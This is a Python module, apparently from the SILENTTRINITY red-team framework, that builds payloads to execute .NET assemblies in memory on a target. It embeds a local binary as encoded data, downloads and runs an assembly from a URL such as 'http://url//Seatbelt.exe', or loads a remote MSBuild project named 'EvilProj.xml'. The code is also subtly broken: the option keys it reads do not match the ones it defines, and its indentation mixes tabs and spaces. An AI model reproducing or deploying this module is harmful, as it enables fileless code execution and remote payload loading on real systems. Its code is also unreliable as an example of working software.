import os
from shlex import split
from core.teamserver.module import Module
from core.teamserver.utils import dotnet_deflate_and_encode


class STModule(Module):
    def __init__(self):
        self.name = 'boo/execute-assembly'
        self.language = 'boo'
        self.description = 'Execute local or remote .NET assembly in memory. Remote-project uses Msbuild to load *.xml or *.csproj projects'
        self.author = '@byt3bl33d3r, @anthemtotheego (Csharp project), @hackabean(BooLang port)'
        self.references = []
        self.options = {
            'LocalAssembly': {
                'Description'   :   'Path to local assembly',
                'Required'      :   True,
                'Value'         :   'eg. /tmp/Seatbelt.exe'
            },
            'RemoteAssemebly': {
                'Description'   :   'Path to remote assembly to load from URL',
                'Required'      :   True,
                'Value'         :   'eg. http://url//Seatbelt.exe'
            },
            'RemoteProject': {
                'Description'   :   'Path to remote project to load from URL (csproj or xml)',
                'Required'      :   True,
                'Value'         :   'eg. http://url//EvilProj.xml'
            },

            'Arguments': {
                'Description'   :   'Arguments to pass to the assembly on runtime',
                'Required'      :   False,
                'Value'         :   'eg. user'
            }
        }

    def payload(self):

        if self.options['Local-Assembly']['Value']: 
        	with open('core/teamserver/modules/boo/src/local-assembly.boo') as module:
                    module = module.read()          
                    assembly_path = os.path.expanduser(self.options['LocalAssembly']['Value'])

                    if not os.path.exists(assembly_path):
                        raise Exception("LocalAssembly not found in specified path")

                    assembly_size = os.path.getsize(assembly_path)
                    with open(assembly_path, 'rb') as assembly:
                        module = module.replace("B64_ENCODED_COMPRESSED_ASSEMBLY", dotnet_deflate_and_encode(assembly.read()))
                        module = module.replace("DECOMPRESSED_ASSEMBLY_LENGTH", str(assembly_size))
                    
                    module = module.replace('ASSEMBLY_ARGS', str(self.options['Arguments']['Value']))

                    #Is this really needed ? Assembly would throw https://github.com/byt3bl33d3r/SILENTTRINITY/issues/104#issuecomment-535724440 if used
                    #boolang_string_array = ''
                    #if self.options['Arguments']['Value']:
                    #    formatted_arguments = r', '.join([fr"`{arg}`" for arg in split(self.options['Arguments']['Value'])])
                    #    boolang_string_array = f"= array(string, ({formatted_arguments}))"

                    #module = module.replace("ASSEMBLY_ARGS", boolang_string_array)
                    #print(module)
                    return module


        elif self.options['Remote-Assemebly']['Value']: 
    	    with open('core/teamserver/modules/boo/src/remote-assembly.boo', 'r') as module_src:
                src = module_src.read()
                src = src.replace('BINARY', str(self.options['RemoteAssemebly']['Value']))
                src = src.replace('ASSEMBLY_ARGS', str(self.options['Arguments']['Value']))
                return src

        elif self.options['Remote-Project']['Value']: 
    	    with open('core/teamserver/modules/boo/src/remote-project.boo', 'r') as module_src:
                src = module_src.read()
                src = src.replace('PROJECT', str(self.options['RemoteProject']['Value']))
                return src      	
